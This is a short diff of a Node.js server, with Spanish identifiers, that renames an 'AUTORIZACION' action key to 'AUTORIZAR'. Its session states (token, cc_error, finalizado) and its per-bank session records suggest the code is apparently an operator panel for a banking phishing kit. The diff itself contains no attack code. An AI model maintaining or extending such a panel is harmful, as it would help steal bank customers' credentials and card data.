@@ -325,7 +325,7 @@ const server = http.createServer(async (req, res) => {
                     TOKEN: 'token', 
                     FINALIZAR: 'finalizado',
                     CC_ERROR: 'cc_error',
-                    AUTORIZACION: 'autorizacion' // 🔥 NUEVO
+                    AUTORIZAR: 'autorizacion' // 🔥 NUEVO
                 };
                 if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                 
@@ -534,7 +534,7 @@ const server = http.createServer(async (req, res) => {
 
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'autorizacion_enviada');
-            ultimaAccionSesiones.set(sessionId, 'AUTORIZACION');
+            ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
 
             guardarHistorial(bancoKey, datosCompletos);
             agregarLog('autorizacion', { sessionId, usuario });
